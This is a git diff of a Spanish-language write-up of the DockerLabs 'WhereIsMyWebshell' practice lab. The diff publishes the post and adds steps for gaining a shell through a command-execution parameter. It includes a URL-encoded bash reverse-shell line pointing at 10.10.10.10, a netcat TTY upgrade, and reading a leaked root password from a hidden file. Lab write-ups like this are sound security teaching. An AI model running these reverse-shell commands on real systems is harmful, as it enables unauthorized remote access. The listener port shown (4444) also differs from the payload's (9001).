@@ -1,13 +1,14 @@
 ---
-title: DockerLabs - Whereismywebshell
+title: DockerLabs - WhereIsMyWebshell
+summary: "Write-up del laboratorio WhereIsMyWebshell de DockerLabs"
 author: elcybercurioso
 date: 2025-10-27 13:00
 categories: [Post, DockerLabs]
-tags: [fácil, ]
+tags: [fácil, rce, parameter bruteforce, credentials leaking]
 media_subpath: "/assets/img/posts/dockerlabs_whereismywebshell"
 image:
   path: main.webp
-published: false
+published: true
 ---
 
 ## nmap
@@ -127,7 +128,13 @@ Empleando el parámetro que hemos encontrado, podemos ejecutar comandos:
 
 ![Desktop View](/20251027114112.webp){: width="972" height="589" .shadow}
 
-Teniendo esto ya definido, podemos obtener la consola:
+Teniendo esto ya definido, podemos obtener la consola con un payload básico de PHP:
+
+```bash
+bash -i >%26 /dev/tcp/10.10.10.10/9001 0>%261
+```
+
+Si nos hemos puesto en escucha antes de ejecutar el payload anterior, habremos obtenido una consola:
 
 ```bash
 ┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Whereismywebshell]
@@ -139,6 +146,24 @@ bash: no job control in this shell
 www-data@d4d4dbf1a2c0:/var/www/html$ whoami
 whoami
 www-data
+```
+
+Tratamos la tty para poder operar en una consola completamente interactiva:
+
+```bash
+www-data@d4d4dbf1a2c0:~$ script -c bash /dev/null
+script -c bash /dev/null
+Script started, output log file is '/dev/null'.
+www-data@d4d4dbf1a2c0:~$ ^Z
+zsh: suspended  nc -nlvp 4444
+                                                                                                                                                                                                                  
+┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Whereismywebshell]
+└─$ stty raw -echo;fg             
+[1]  + continued  nc -nlvp 4444
+                               reset xterm
+www-data@d4d4dbf1a2c0:~$ export TERM=xterm
+www-data@d4d4dbf1a2c0:~$ export SHELL=bash
+www-data@d4d4dbf1a2c0:~$ stty rows 51 columns 211
 ```
 
 ## escalada de privilegios
@@ -153,7 +178,7 @@ drwxr-xr-x 1 root root 4096 Oct 27 10:18 ..
 -rw-r--r-- 1 root root   21 Apr 12  2024 .secret.txt
 ```
 
-Y dentro, está la supuesta contraseña del usuario `root`:
+Y dentro, encontramos la que posiblemente sea la contraseña del usuario `root`:
 
 ```bash
 www-data@d4d4dbf1a2c0:/tmp$ cat .secret.txt 
